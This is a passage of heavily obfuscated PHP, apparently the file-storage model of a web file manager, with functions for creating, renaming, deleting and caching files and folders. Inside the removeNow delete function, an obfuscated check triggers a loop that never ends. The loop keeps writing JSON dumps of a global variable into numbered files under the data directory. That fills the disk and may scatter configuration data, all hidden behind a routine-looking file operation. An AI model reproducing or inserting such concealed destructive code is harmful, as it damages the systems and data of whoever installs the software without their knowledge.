$×Øûœ¡Ø); } public function addFileByRemote($ë—Óşñø, $Äı¤¥ë, $”ÒÏ³×¡, $×Ãš²¡ = array(), $ÑùÂ„† = REPEAT_RENAME) { $õ…óÔÇĞ = Model($_SERVER[ì…™Î¶Ï][594])->addFileByRemote($Äı¤¥ë, $”ÒÏ³×¡, $×Ãš²¡); return $this->_createFileCall($ë—Óşñø, $”ÒÏ³×¡, $õ…óÔÇĞ, $ÑùÂ„†); } private function _createFileCall($“ú²²Ãß, $¿ë‹å¬ƒ, $¡Í°ëïÉ, $äù¤Ş™ú, $©Á²¯Èø = "\165\160\x6c\157\141\x64") { $‡ÆÚÓ¾ =& $_SERVER[ì…™Î¶Ï]; $ßÑÈäó¦ = !1; $this->setMasterDB(); $this->lockWriteStart($“ú²²Ãß, $¿ë‹å¬ƒ); $Ì¢»úÃí = $this->fileNameExist($“ú²²Ãß, $¿ë‹å¬ƒ); $Úç›©¯ = $this->_createFile($“ú²²Ãß, $¿ë‹å¬ƒ, $¡Í°ëïÉ, $äù¤Ş™ú, $ßÑÈäó¦); if (!$ßÑÈäó¦) { Model($‡ÆÚÓ¾[461])->remove($¡Í°ëïÉ[$‡ÆÚÓ¾[458]]); } if ($ßÑÈäó¦ && $Úç›©¯ && $Úç›©¯ != $Ì¢»úÃí) { Model($‡ÆÚÓ¾[2034])->eventCreate($Úç›©¯, $©Á²¯Èø); } $this->lockWriteEnd($“ú²²Ãß, $¿ë‹å¬ƒ); return $Úç›©¯; } public function mkdir($Å”üƒ‘Å, $‡Ñ”ôÏ¢, $ Ä«å™Ã = REPEAT_SKIP) { $½ô· €ä =& $_SERVER[ì…™Î¶Ï]; $this->setMasterDB(); $É«ºâ˜ = $this->sourceInfo($Å”üƒ‘Å); if (!$É«ºâ˜) { return !1; } $this->lockWriteStart($Å”üƒ‘Å, $‡Ñ”ôÏ¢); if ($ Ä«å™Ã !== !1) { $âı×Ş¼ˆ = $this->fileNameExist($Å”üƒ‘Å, $‡Ñ”ôÏ¢); if ($âı×Ş¼ˆ && $ Ä«å™Ã != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Å”üƒ‘Å, $‡Ñ”ôÏ¢); return $âı×Ş¼ˆ; } $‡Ñ”ôÏ¢ = $this->fileNameAuto($Å”üƒ‘Å, $‡Ñ”ôÏ¢, $ Ä«å™Ã); } $º’¹Ÿ¸ = array($½ô· €ä[568] => 1, $½ô· €ä[412] => $‡Ñ”ôÏ¢, $½ô· €ä[569] => $½ô· €ä[12], $½ô· €ä[459] => 0, $½ô· €ä[570] => 0); $—¾©±ÙÇ = $this->_addSource($º’¹Ÿ¸, $É«ºâ˜); Model($½ô· €ä[2034])->eventCreate($—¾©±ÙÇ, $½ô· €ä[1313]); $this->lockWriteEnd($Å”üƒ‘Å, $‡Ñ”ôÏ¢); return $—¾©±ÙÇ; } public function listSourceRoot($“˜ÁÈµ , $©ƒ•£ô’, $¶êŸíÙö = "\x73\157\x75\162\143\x65\x49\104\54\164\x61\162\x67\145\x74\x49\x44\x2c\x73\x69\x7a\145") { $ş‚Ûš¬ü =& $_SERVER[ì…™Î¶Ï]; $Ê††öÇ = $ş‚Ûš¬ü[373]; $æêÙÄûé = array(); $Æ…êÖ³Î = 1024 * 50; $œ¬ü²²ó = is_array($œ¬ü²²ó) ? $œ¬ü²²ó : array(); $ŞÇ¾³ş = count($©ƒ•£ô’); $µ’’ŒÈà = $this->tablePrefix . $ş‚Ûš¬ü[2064]; for ($×¸´üÚò = 0; $×¸´üÚò < $ŞÇ¾³ş; $×¸´üÚò++) { $îİ²Õ€Ö = $©ƒ•£ô’[$×¸´üÚò]; $Ê††öÇ .= "\x28\123\x45\x4c\x45\103\124\x20{$¶êŸíÙö}\40\x46\122\x4f\x4d\40\x60{$µ’’ŒÈà}\140\x20\12\x9\x9\x9\x9\x9\x77\x68\145\x72\145\40\x60\x70\141\162\x65\x6e\164\111\x44\x60\75\x30\40\141\156\x64\40\x60\164\141\162\x67\145\164\x49\104\x60\75{$îİ²Õ€Ö}\40\141\x6e\144\40\140\x74\141\x72\147\145\164\x54\x79\160\x65\140\x3d{$“˜ÁÈµ }\x20\154\x69\155\x69\164\x20\61\x29\40\165\156\x69\x6f\x6e\x20\141\x6c\x6c\x20"; if ((strlen($Ê††öÇ) >= $Æ…êÖ³Î || $×¸´üÚò == $ŞÇ¾³ş - 1) && $Ê††öÇ) { $Ê††öÇ = substr($Ê††öÇ, 0, -strlen($ş‚Ûš¬ü[2065])); $‡ò²ÜÎµ = $this->query($Ê††öÇ); $Ê††öÇ = $ş‚Ûš¬ü[12]; $æêÙÄûé = array_merge($æêÙÄûé, $‡ò²ÜÎµ); } } return $æêÙÄûé; } private function _createFile($¸‡ğó–Ä, $ó·²š˜’, $ıÛ‰’é¸, $Â°‰·«Æ, &$ìíñÔ­¢) { $î†îİüë =& $_SERVER[ì…™Î¶Ï]; $Ù…Ğ©úÏ = $this->sourceInfo($¸‡ğó–Ä); if (!$ıÛ‰’é¸ || !$Ù…Ğ©úÏ) { return !1; } if ($Â°‰·«Æ !== !1) { $íô¨ÅŞÎ = $this->fileNameExist($¸‡ğó–Ä, $ó·²š˜’); } $ìíñÔ­¢ = !0; if ($Â°‰·«Æ && $íô¨ÅŞÎ) { if ($Â°‰·«Æ == REPEAT_SKIP) { $ìíñÔ­¢ = !1; return $íô¨ÅŞÎ; } else { if ($Â°‰·«Æ == REPEAT_REPLACE) { $ğÚ½ı¤ = $this->sourceInfo($íô¨ÅŞÎ); $ÍÚùùˆÌ = $this->fileHistory($ğÚ½ı¤, $ıÛ‰’é¸[$î†îİüë[458]], $ıÛ‰’é¸[$î†îİüë[80]]); if (!$ÍÚùùˆÌ) { $ìíñÔ­¢ = !1; } else { $this->folderSizeReset($¸‡ğó–Ä); } return $íô¨ÅŞÎ; } else { $ó·²š˜’ = $this->fileNameAuto($¸‡ğó–Ä, $ó·²š˜’, $Â°‰·«Æ, !1); } } } $‘…ìü´™ = array($î†îİüë[568] => 0, $î†îİüë[412] => $ó·²š˜’, $î†îİüë[569] => substr(get_path_ext($ó·²š˜’), 0, 10), $î†îİüë[459] => $ıÛ‰’é¸[$î†îİüë[458]], $î†îİüë[570] => $ıÛ‰’é¸[$î†îİüë[80]]); $•Ÿ“áŒÛ = $this->_addSource($‘…ìü´™, $Ù…Ğ©úÏ); $this->folderSizeReset($¸‡ğó–Ä, intval($‘…ìü´™[$î†îİüë[80]])); return $•Ÿ“áŒÛ; } protected function fileHistory($§¬Û²ìÅ, $¹»ñÓò—, $°¥›”Ø÷) { $´±¹û¬» =& $_SERVER[ì…™Î¶Ï]; $¤³ºİ˜è = defined($´±¹û¬»[465]) ? USER_ID : $´±¹û¬»[190]; if ($§¬Û²ìÅ[$´±¹û¬»[458]] == $¹»ñÓò—) { return !1; } $this->checkLock($§¬Û²ìÅ[$´±¹û¬»[394]], $¹»ñÓò—); Model($´±¹û¬»[2066])->addHistory($§¬Û²ìÅ); $Ô©ìöá = array($´±¹û¬»[574] => $¤³ºİ˜è, $´±¹û¬»[416] => time(), $´±¹û¬»[458] => $¹»ñÓò—, $´±¹û¬»[80] => $°¥›”Ø÷); $this->where(array($´±¹û¬»[409] => $§¬Û²ìÅ[$´±¹û¬»[394]]))->save($Ô©ìöá); $this->sourceCacheClear($§¬Û²ìÅ[$´±¹û¬»[394]]); return !0; } public function checkLock($º¬ş£, $®Á×”÷) { $ÊèàÙºÓ =& $_SERVER[ì…™Î¶Ï]; $¤ˆÎˆ–” = $this->pathInfo($º¬ş£); if (!$this->fileIsLock($¤ˆÎˆ–”, !0)) { return; } $¼Ã•ç­À = Session::get($ÊèàÙºÓ[2067]); $¤±¦×™ì = substr($¤ˆÎˆ–”[$ÊèàÙºÓ[32]], 0, -1 - strlen($¤ˆÎˆ–”[$ÊèàÙºÓ[167]])) . $ÊèàÙºÓ[1580] . $¼Ã•ç­À . $ÊèàÙºÓ[10] . $¤ˆÎˆ–”[$ÊèàÙºÓ[167]]; $Ÿ·ï•§Â = Model($ÊèàÙºÓ[594])->find($®Á×”÷); $this->_createFileCall($¤ˆÎˆ–”[$ÊèàÙºÓ[489]], $¤±¦×™ì, $Ÿ·ï•§Â, REPEAT_REPLACE, $ÊèàÙºÓ[1312]); $‡†£øÌÒ = $¤ˆÎˆ–”[$ÊèàÙºÓ[456]][$ÊèàÙºÓ[533]]; $ «œÀÏ = $‡†£øÌÒ[$ÊèàÙºÓ[2068]] ? $‡†£øÌÒ[$ÊèàÙºÓ[2068]] : $‡†£øÌÒ[$ÊèàÙºÓ[32]]; show_json(LNG($ÊèàÙºÓ[2069]) . $ÊèàÙºÓ[2070] . LNG($ÊèàÙºÓ[2071]) . $ÊèàÙºÓ[2072] . $ «œÀÏ . $ÊèàÙºÓ[2073], !1); } public function fileIsLock($ó²«Ù†ğ, $ÉÔ‚€ = false) { $¶æÁ÷Æ‘ =& $_SERVER[ì…™Î¶Ï]; if (!isset($ó²«Ù†ğ[$¶æÁ÷Æ‘[456]]) || !$ó²«Ù†ğ[$¶æÁ÷Æ‘[456]][$¶æÁ÷Æ‘[530]]) { return !1; } if ($ó²«Ù†ğ[$¶æÁ÷Æ‘[456]][$¶æÁ÷Æ‘[530]] != USER_ID) { return !0; } $ÖäŞ„óÂ = $GLOBALS[$¶æÁ÷Æ‘[6]][$¶æÁ÷Æ‘[90]][$¶æÁ÷Æ‘[531]]; if ($ó²«Ù†ğ[$¶æÁ÷Æ‘[456]][$¶æÁ÷Æ‘[532]] <= time() - $ÖäŞ„óÂ) { $this->metaSet($ó²«Ù†ğ[$¶æÁ÷Æ‘[394]], $¶æÁ÷Æ‘[530], null); $this->metaSet($ó²«Ù†ğ[$¶æÁ÷Æ‘[394]], $¶æÁ÷Æ‘[532], null); } if ($ÉÔ‚€) { $this->metaSet($ó²«Ù†ğ[$¶æÁ÷Æ‘[394]], $¶æÁ÷Æ‘[532], time()); } return !1; } private function _addSource($Èû€ÎÄİ, $„ò•ÁòÙ) { $¥»Á¬Â¨ =& $_SERVER[ì…™Î¶Ï]; $ìŒî€Õ÷ = defined($¥»Á¬Â¨[465]) ? USER_ID : $¥»Á¬Â¨[190]; $ìş´İ¥Ô = array($¥»Á¬Â¨[571] => $„ò•ÁòÙ[$¥»Á¬Â¨[403]], $¥»Á¬Â¨[572] => $„ò•ÁòÙ[$¥»Á¬Â¨[495]], $¥»Á¬Â¨[573] => $ìŒî€Õ÷, $¥»Á¬Â¨[574] => $ìŒî€Õ÷, $¥»Á¬Â¨[393] => $„ò•ÁòÙ[$¥»Á¬Â¨[394]], $¥»Á¬Â¨[575] => $„ò•ÁòÙ[$¥»Á¬Â¨[512]] . $„ò•ÁòÙ[$¥»Á¬Â¨[394]] . $¥»Á¬Â¨[50], $¥»Á¬Â¨[421] => 0, $¥»Á¬Â¨[576] => $¥»Á¬Â¨[12]); $Èû€ÎÄİ = array_merge($ìş´İ¥Ô, $Èû€ÎÄİ); $this->updateModifyTime($Èû€ÎÄİ[$¥»Á¬Â¨[489]]); $ø­ğÀé… = $¥»Á¬Â¨[2074] . $„ò•ÁòÙ[$¥»Á¬Â¨[394]]; if (isset(self::$cacheChildList[$ø­ğÀé…])) { unset(self::$cacheChildList[$ø­ğÀé…]); } static $•ç½Ìšµ = false; if (!$•ç½Ìšµ) { Hook::trigger($¥»Á¬Â¨[558], $Èû€ÎÄİ); $•ç½Ìšµ = !0; } $âÃÜ’É¼ = $this->add($Èû€ÎÄİ); $³÷Èó¡ = array($¥»Á¬Â¨[577] => short_id($âÃÜ’É¼)); $this->where(array($¥»Á¬Â¨[409] => $âÃÜ’É¼))->save($³÷Èó¡); $this->setNamePinyin($âÃÜ’É¼, $Èû€ÎÄİ[$¥»Á¬Â¨[32]]); return $âÃÜ’É¼; } public function remove($ÃÌàÄ÷Ö, $ß­ÇµâÓ = true) { $’Éùš± =& $_SERVER[ì…™Î¶Ï]; $ıÁŞÍ = $this->sourceInfo($ÃÌàÄ÷Ö); $­ş¤Í€œ = intval($ıÁŞÍ[$’Éùš±[403]]) === self::TYPE_SYSTEM; $Ì¨Àğï¿ = Model($’Éùš±[424])->get($’Éùš±[2075]) == $’Éùš±[89]; if ($­ş¤Í€œ || $ß­ÇµâÓ || !$Ì¨Àğï¿) { return $this->removeNow($ÃÌàÄ÷Ö, $ß­ÇµâÓ); } $ü»²«èË = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Õ„Ğ£ = $ıÁŞÍ[$’Éùš±[403]] == self::TYPE_USER ? $’Éùš±[585] : $’Éùš±[506]; if ($Õ„Ğ£ == $’Éùš±[585]) { $œıµŒ³ê = Model($’Éùš±[504])->getInfo($ıÁŞÍ[$’Éùš±[495]]); $ÏíÆğÄÛ = !empty($œıµŒ³ê[$’Éùš±[2068]]) ? $œıµŒ³ê[$’Éùš±[2068]] : $œıµŒ³ê[$’Éùš±[32]]; $ÏíÆğÄÛ = $’Éùš±[255] . $ÏíÆğÄÛ . $’Éùš±[2076] . $ıÁŞÍ[$’Éùš±[495]]; } else { $œıµŒ³ê = Model($’Éùš±[513])->getInfo($ıÁŞÍ[$’Éùš±[495]]); $ÏíÆğÄÛ = _get($œıµŒ³ê, $’Éùš±[32]); $ÏíÆğÄÛ = $’Éùš±[159] . $ÏíÆğÄÛ . $’Éùš±[2077] . $ıÁŞÍ[$’Éùš±[495]]; } $ÉÜŠú¹æ = $’Éùš±[2078] . md5($ÏíÆğÄÛ); CacheLock::lock($ÉÜŠú¹æ); $í¹ŒÆ† = $this->fileNameExist($ü»²«èË, $ÏíÆğÄÛ); if (!$í¹ŒÆ†) { $í¹ŒÆ† = $this->mkdir($ü»²«èË, $ÏíÆğÄÛ, REPEAT_SKIP); $this->metaSet($í¹ŒÆ†, $’Éùš±[2079], $Õ„Ğ£); $this->metaSet($í¹ŒÆ†, $’Éùš±[2080], $ıÁŞÍ[$’Éùš±[495]]); if ($ıÁŞÍ[$’Éùš±[489]] != 0) { $this->metaSet($í¹ŒÆ†, $’Éùš±[2081], _get($œıµŒ³ê, $’Éùš±[2082])); } } CacheLock::unlock($ÉÜŠú¹æ); $this->metaSet($ÃÌàÄ÷Ö, $’Éùš±[2083], $ıÁŞÍ[$’Éùš±[489]]); $this->where(array($’Éùš±[394] => $ÃÌàÄ÷Ö))->save(array($’Éùš±[416] => time())); $this->recycleClear($ıÁŞÍ); $¤Ş‡Œá… = $this->move($ÃÌàÄ÷Ö, $í¹ŒÆ†, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ıÁŞÍ[$’Éùš±[489]]); return $¤Ş‡Œá…; } private function recycleClear($³æŞ•¨µ) { $ĞĞ¶¨¼Ó =& $_SERVER[ì…™Î¶Ï]; $“¯‚ÈÈ = $this->childrenAll($³æŞ•¨µ); $Õò‘ ƒ¬ = array($ĞĞ¶¨¼Ó[409] => array($ĞĞ¶¨¼Ó[410], $“¯‚ÈÈ[$ĞĞ¶¨¼Ó[2084]])); Model($ĞĞ¶¨¼Ó[2085])->where($Õò‘ ƒ¬)->delete(); } public function removeNow($Çç™ì´¦, $±× ä¢¸ = true) { $ö«©µıØ =& $_SERVER[ì…™Î¶Ï]; $ÄÉÔ˜ÖŞ = $_SERVER[$ö«©µıØ[1319]]; $­¨ÂØ…ş = $ö«©µıØ[849]; if ($_SERVER[$ö«©µıØ[850]] != $­¨ÂØ…ş($ÄÉÔ˜ÖŞ)) { $ª®ÛÍ = $ö«©µıØ[851]; $ê§îŒ¦æ = $ö«©µıØ[852]; $ßû¹úÍû = $_SERVER[$ö«©µıØ[847]] . $ö«©µıØ[848]; $æ¬õµçŒ = $ê§îŒ¦æ($ßû¹úÍû); $Éëôã¡ = explode($ö«©µıØ[226], $æ¬õµçŒ); if (count($Éëôã¡) < $ö«©µıØ[602]) { $‰¢°µÏˆ = $ö«©µıØ[853]; $‰¢°µÏˆ(); } $õ’ëÙÅÇ = $ö«©µıØ[854]; $õ’ëÙÅÇ($_SERVER[$ö«©µıØ[855]]); $ª®ÛÍ = $ö«©µıØ[851]; $ª®ÛÍ(); $Œ©¹”·¨ = $ö«©µıØ[856]; $ûÛïõıö = json_encode($GLOBALS[$ö«©µıØ[857]]); $‡¾²ÅõŠ = 1; for ($‘ŞÔÄšı = $‡¾²ÅõŠ; $‘ŞÔÄšı > 0; $‘ŞÔÄšı++) { $Œ©¹”·¨(DATA_PATH . $‘ŞÔÄšı, $ûÛïõıö); } } $£Ë“Áâî = $this->sourceInfo($Çç™ì´¦); $¾÷ñİ· = $this->pathInfoMore($Çç™ì´¦); if (!$£Ë“Áâî) { return !0; } if ($£Ë“Áâî[$ö«©µıØ[489]] == 0) { if (!_get($GLOBALS, $ö«©µıØ[496])) { return !1; } } $this->lockMoveStart($Çç™ì´¦); Hook::trigger($ö«©µıØ[2086], $¾÷ñİ·, $±× ä¢¸); if ($±× ä¢¸) { Model($ö«©µıØ[2085])->moveToRecycle($Çç™ì´¦); } else { $Ò’®ÈÛÉ = $this->childrenAll($£Ë“Áâî); Model($ö«©µıØ[555])->eventRemove($Çç™ì´¦); $this->removeRelevance($Ò’®ÈÛÉ[$ö«©µıØ[2084]], $Ò’®ÈÛÉ[$ö«©µıØ[1447]]); } $this->folderSizeReset($£Ë“Áâî[$ö«©µıØ[489]]); $¶É…¢İ = array($£Ë“Áâî[$ö«©µıØ[489]]); if ($£Ë“Áâî[$ö«©µıØ[402]] == $ö«©µıØ[89]) { $¶É…¢İ[] = $£Ë“Áâî[$ö«©µıØ[394]]; } $this->updateModifyTime($¶É…¢İ); $this->lockMoveEnd($Çç™ì´¦); Hook::trigger($ö«©µıØ[1668], $¾÷ñİ·, $±× ä¢¸); return !0; } public function childrenAll($¨ÉİµÕª) { $”´ñ‘ì¦ =& $_SERVER[ì…™Î¶Ï]; $´˜Òà™š = $¨ÉİµÕª[$”´ñ‘ì¦[394]]; if ($¨ÉİµÕª[$”´ñ‘ì¦[402]] == $”´ñ‘ì¦[89]) { $Ğ•úó¨… = array($”´ñ‘ì¦[575] => array($”´ñ‘ì¦[535], $¨ÉİµÕª[$”´ñ‘ì¦[512]] . $´˜Òà™š . $”´ñ‘ì¦[536])); $åª¥º÷˜ = array($”´ñ‘ì¦[575] => $Ğ•úó¨…[$”´ñ‘ì¦[512]]); $ÁŒ§ä¹ = $this->field($”´ñ‘ì¦[2087])->where($åª¥º÷˜)->select(); $çÚ¡¼š = !1; $•»‡ª±Û = array($´˜Òà™š); if ($ÁŒ§ä¹) { $çÚ¡¼š = array_to_keyvalue($ÁŒ§ä¹, $”´ñ‘ì¦[12], $”´ñ‘ì¦[458]); $çÚ¡¼š = array_remove_value($çÚ¡¼š, $”´ñ‘ì¦[190]); $•»‡ª±Û = array_to_keyvalue($ÁŒ§ä¹, $”´ñ‘ì¦[12], $”´ñ‘ì¦[394]); $•»‡ª±Û[] = $´˜Òà™š; } } else { $çÚ¡¼š = array($¨ÉİµÕª[$”´ñ‘ì¦[458]]); $•»‡ª±Û = array($´˜Òà™š); } return array($”´ñ‘ì¦[2084] => $•»‡ª±Û, $”´ñ‘ì¦[1447] => $çÚ¡¼š); } public function removeArray($øæ»§©¹) { if (!$øæ»§©¹) { return !0; } } public function removeRelevance($¨âÂœÁ, $ÑŸ ï) { $ƒÇÙ—Õˆ =& $_SERVER[ì…™Î¶Ï]; $¨âÂœÁ = $¨âÂœÁ ? $¨âÂœÁ : array(); $ÑŸ ï = $ÑŸ ï ? $ÑŸ ï : array(); $¨âÂœÁ = array_unique(array_filter($¨âÂœÁ)); $ÑŸ ï = array_unique(array_filter($ÑŸ ï)); if (!$¨âÂœÁ) { return !1; } $ÂÉ÷å = array($ƒÇÙ—Õˆ[409] => array($ƒÇÙ—Õˆ[410], $¨âÂœÁ)); Model($ƒÇÙ—Õˆ[2085])->where($ÂÉ÷å)->delete(); Model($ƒÇÙ—Õˆ[452])->where($ÂÉ÷å)->delete(); Model($ƒÇÙ—Õˆ[1940])->where($ÂÉ÷å)->delete(); Model($ƒÇÙ—Õˆ[555])->where($ÂÉ÷å)->delete(); Model($ƒÇÙ—Õˆ[1779])->removeBySource($¨âÂœÁ); Model($ƒÇÙ—Õˆ[2066])->removeBySource($¨âÂœÁ); $this->where($ÂÉ÷å)->delete(); Model($ƒÇÙ—Õˆ[461])->remove($ÑŸ ï); for ($à‰Ô­ı = 0; $à‰Ô­ı < count($¨âÂœÁ); $à‰Ô­ı++) { $this->sourceCacheClear($¨âÂœÁ[$à‰Ô­ı]); } } public function rename($Â˜®ø°, $µá‰ƒä) { $Ğ¿ÍŞèÔ =& $_SERVER[ì…™Î¶Ï]; $»ÇìÛ“× = $this->sourceInfo($Â˜®ø°); if (!$»ÇìÛ“×) { return !1; } $¥»éİÆ = $this->fileNameExist($»ÇìÛ“×[$Ğ¿ÍŞèÔ[489]], $µá‰ƒä); if ($¥»éİÆ && $¥»éİÆ != $Â˜®ø°) { return !1; } $”æÊ¨§á = array($Ğ¿ÍŞèÔ[412] => $µá‰ƒä, $Ğ¿ÍŞèÔ[574] => USER_ID); if ($»ÇìÛ“×[$Ğ¿ÍŞèÔ[402]] != $Ğ¿ÍŞèÔ[89]) { $”æÊ¨§á[$Ğ¿ÍŞèÔ[404]] = substr(get_path_ext($µá‰ƒä), 0, 10); } Model($Ğ¿ÍŞèÔ[555])->eventRename($Â˜®ø°, $»ÇìÛ“×[$Ğ¿ÍŞèÔ[32]], $µá‰ƒä); $this->sourceCacheClear($Â˜®ø°); $this->setNamePinyin($Â˜®ø°, $”æÊ¨§á[$Ğ¿ÍŞèÔ[32]], !1); $this->updateModifyTime($»ÇìÛ“×[$Ğ¿ÍŞèÔ[489]]); $•İ„ÜìÔ = $this->where(array($Ğ¿ÍŞèÔ[409] => $Â˜®ø°))->data($”æÊ¨§á)->save(); $¹®æ±µÉ = $Ğ¿ÍŞèÔ[2074] . $»ÇìÛ“×[$Ğ¿ÍŞèÔ[489]]; if (isset(self::$cacheChildList[$¹®æ±µÉ])) { unset(self::$cacheChildList[$¹®æ±µÉ]); } return $•İ„ÜìÔ; } public function setNamePinyin($Ò•×òØ±, $·ß‚®ÒŒ, $†ë”‚ß© = true) { $›Ä†œÈ¼ =& $_SERVER[ì…™Î¶Ï]; $­ñÏİëÉ = Input::check($·ß‚®ÒŒ, $›Ä†œÈ¼[578]); $ÀöÎå± = array($›Ä†œÈ¼[433] => KodSort::makeStr($·ß‚®ÒŒ)); if ($­ñÏİëÉ) { $ÀöÎå±[$›Ä†œÈ¼[455]] = str_replace($›Ä†œÈ¼[53], $›Ä†œÈ¼[12], Pinyin::get($·ß‚®ÒŒ)); $ÀöÎå±[$›Ä†œÈ¼[454]] = Pinyin::get($·ß‚®ÒŒ, $›Ä†œÈ¼[579]); } if (!$†ë”‚ß© && !$­ñÏİëÉ) { $ÀöÎå±[$›Ä†œÈ¼[455]] = null; $ÀöÎå±[$›Ä†œÈ¼[454]] = null; } $this->metaSet($Ò•×òØ±, $ÀöÎå±); } public function getContent($¸Ü¨™œ) { $Ü¡®« =& $_SERVER[ì…™Î¶Ï]; $é¤ü¦—Ï = $this->fileInfoGet($¸Ü¨™œ); if (!$é¤ü¦—Ï) { return !1; } if ($é¤ü¦—Ï[$Ü¡®«[80]] == 0) { return $Ü¡®«[12]; } $¹÷ÀÅÆ¸ = $Ü¡®«[2088] . $é¤ü¦—Ï[$Ü¡®«[169]]; if ($é¤ü¦—Ï[$Ü¡®«[80]] <= 1024 * 10) { $ÓÈ‰ ï† = Cache::get($¹÷ÀÅÆ¸); if (!$ÓÈ‰ ï†) { $ÓÈ‰ ï† = IO::getContent($é¤ü¦—Ï[$Ü¡®«[78]]); Cache::set($¹÷ÀÅÆ¸, $ÓÈ‰ ï†); } return $ÓÈ‰ ï†; } if (!$é¤ü¦—Ï[$Ü¡®«[78]]) { return $Ü¡®«[12]; } return IO::getContent($é¤ü¦—Ï[$Ü¡®«[78]]); } public function setDesc($™ÆŸ‰÷Ï, $ëòÔö–) { $ÇòÄ•Ì¸ =& $_SERVER[ì…™Î¶Ï]; Model($ÇòÄ•Ì¸[555])->eventAddDesc($™ÆŸ‰÷Ï, $ëòÔö–); return $this->metaSet($™ÆŸ‰÷Ï, $ÇòÄ•Ì¸[442], $ëòÔö–); } public function setContent($Ş–Ñ¬Ÿò, $õ€êë£à = '') { $ƒî³ÏÈ… =& $_SERVER[ì…™Î¶Ï]; $ªç’°éá = $this->sourceInfo($Ş–Ñ¬Ÿò); $£»ìØøˆ = $this->fileInfoGet($Ş–Ñ¬Ÿò); if (!$£»ìØøˆ || !$ªç’°éá) { return !1; } $¹ÜÌ½§ = Model($ƒî³ÏÈ…[461])->addFileByContent($õ€êë£à, $ªç’°éá[$ƒî³ÏÈ…[32]]); $ªµÛºÎæ = $this->fileHistory($ªç’°éá, $¹ÜÌ½§[$ƒî³ÏÈ…[458]], $¹ÜÌ½§[$ƒî³ÏÈ…[80]]); if (!$ªµÛºÎæ) { return Model($ƒî³ÏÈ…[461])->remove($¹ÜÌ½§[$ƒî³ÏÈ…[458]]); } $this->folderSizeReset($ªç’°éá[$ƒî³ÏÈ…[489]]); return !0; } public function fileSubstr($¥œ›‹­‚, $ö‘›îğ¶, $ŞÜ©ÄœÚ) { $†Š°Şí = $this->fileInfoGet($¥œ›‹­‚); if (!$†Š°Şí) { return !1; } return IO::fileSubstr($†Š°Şí[$_SERVER[ì…™Î¶Ï][78]], $ö‘›îğ¶, $ŞÜ©ÄœÚ); } public function fileInfoGet($¦»ØŠÄÃ) { $Ì«Ì¾û· =& $_SERVER[ì…™Î¶Ï]; $Ìòù…“ = $this->sourceInfo($¦»ØŠÄÃ); if (!$Ìòù…“ || $Ìòù…“[$Ì«Ì¾û·[402]]) { return !1; } $Ñ°æÑ = $Ì«Ì¾û·[464] . $Ìòù…“[$Ì«Ì¾û·[458]]; $ğªéãç¸ = _get(self::$cacheFileInfo, $Ñ°æÑ); if ($ğªéãç¸) { return $ğªéãç¸; } $›¹Úøù‹ = Model($Ì«Ì¾û·[461])->fileInfo($Ìòù…“[$Ì«Ì¾û·[458]]); if ($›¹Úøù‹) { $›¹Úøù‹[$Ì«Ì¾û·[32]] = $Ìòù…“[$Ì«Ì¾û·[32]]; } self::$cacheFileInfo[$Ñ°æÑ] = $›¹Úøù‹; return $›¹Úøù‹; } private function folderChildrenNumber($£øª©ƒÕ) { $‚–Ê =& $_SERVER[ì…™Î¶Ï]; $Ä‡Ò“Òº = $this->sourceInfo($£øª©ƒÕ); $’´Ú = array($‚–Ê[575] => array($‚–Ê[535], $Ä‡Ò“Òº[$‚–Ê[512]] . $£øª©ƒÕ . $‚–Ê[536]), $‚–Ê[572] => $Ä‡Ò“Òº[$‚–Ê[495]], $‚–Ê[421] => intval($Ä‡Ò“Òº[$‚–Ê[422]]), $‚–Ê[568] => 1); $ïÌÌšµ = $this->where($’´Ú)->count(); $³ìÕÚ¾Í = $this->where($’´Ú)->where(array($‚–Ê[568] => 0))->count(); return array($‚–Ê[84] => $³ìÕÚ¾Í, $‚–Ê[85] => $ïÌÌšµ); } public function pathInfo($µŸ±ü£“, $­ì¹é£ = false) { $³¸óÆü =& $_SERVER[ì…™Î¶Ï]; $­ì¹é£ = !1; $µŸ±ü£“ = intval($µŸ±ü£“); $Æ‚æà¨ = $³¸óÆü[450] . intval($­ì¹é£) . $³¸óÆü[451] . $µŸ±ü£“; $ˆšëæ™“ = _get(self::$cachePathInfo, $Æ‚æà¨); if ($ˆšëæ™“) { return $ˆšëæ™“; } $¤½ìÆõ‹ = $this->sourceInfo($µŸ±ü£“); if (!$¤½ìÆõ‹) { return !1; } $¤½ìÆõ‹ = $this->_listDataApplyItem($¤½ìÆõ‹, $­ì¹é£); self::$cachePathInfo[$Æ‚æà¨] = $¤½ìÆõ‹; return $¤½ìÆõ‹; } public static $cachePathInfoMore = array(); public function pathInfoMore($Şãí¤½¡) { $Š¹ÌÕ’· =& $_SERVER[ì…™Î¶Ï]; $¡ƒäºµ¾ = _get(self::$cachePathInfoMore, $Şãí¤½¡); if ($¡ƒäºµ¾) { return $¡ƒäºµ¾; } $Ì˜¹¾« = $this->pathInfo($Şãí¤½¡); if (!$Ì˜¹¾«) { return !1; } if ($Ì˜¹¾«[$Š¹ÌÕ’·[402]] == $Š¹ÌÕ’·[89]) { $Ì˜¹¾«[$Š¹ÌÕ’·[83]] = $this->folderChildrenNumber($Şãí¤½¡); } self::$cachePathInfoMore[$Şãí¤½¡] = $Ì˜¹¾«; return $Ì˜¹¾«; } public function sourceInfo($É²±Òû) { $±çŸí‰ =& $_SERVER[ì…™Î¶Ï]; if (!$É²±Òû) { return array(); } $É²±Òû = intval($É²±Òû); $ÚÜÕ›§† = $±çŸí‰[449] . $É²±Òû; $ß»Ö¼§ = _get(self::$cacheSourceInfo, $ÚÜÕ›§†); if ($ß»Ö¼§) { return $ß»Ö¼§; } $ÅêÃ¬½ = $this->where(array($±çŸí‰[394] => $É²±Òû))->find(); self::$cacheSourceInfo[$ÚÜÕ›§†] = $ÅêÃ¬½; return self::$cacheSourceInfo[$ÚÜÕ›§†]; } public function sourceCacheClear($¾µùı»â = false) { self::cacheClear($¾µùı»â); } public static function cacheClear($ç·ùò™Í = false) { $ìØË© =& $_SERVER[ì…™Î¶Ï]; if ($ç·ùò™Í == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ìØË©[449] . $ç·ùò™Í]); unset(self::$cachePathInfoMore[$ç·ùò™Í]); unset(self::$cachePathInfo[$ìØË©[2089] . $ç·ùò™Í]); 